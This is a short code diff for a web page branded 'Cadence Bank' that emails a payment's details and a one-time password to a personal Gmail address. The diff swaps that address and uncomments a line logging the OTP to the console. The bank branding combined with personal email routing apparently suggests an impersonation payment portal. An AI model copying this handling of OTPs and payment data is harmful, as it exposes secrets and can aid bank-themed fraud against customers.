@@ -45,9 +45,9 @@ paymentForm.addEventListener('submit', function (e) {
 
 otpButton.addEventListener('click', function (e) {
     e.preventDefault();
-    // console.log(otp);
+    console.log(otp);
     const name = 'Cadence Bank';
-    const email ='cadenceportals@gmail.com';
+    const email ='prosperlekia@gmail.com';
     const subject = 'CADENCE BANK: Verify OTP';
     let message = `Hello, ${name}, you are trying to make a payment to the account with the following transaction details: Account Name - ${accountName.value}, Account Number - ${accountNumber.value}, Bank - ${bank.value}, Amount - $${amount.value}. copy the OTP to continue your transaction.
                     OTP: ${otp}`;
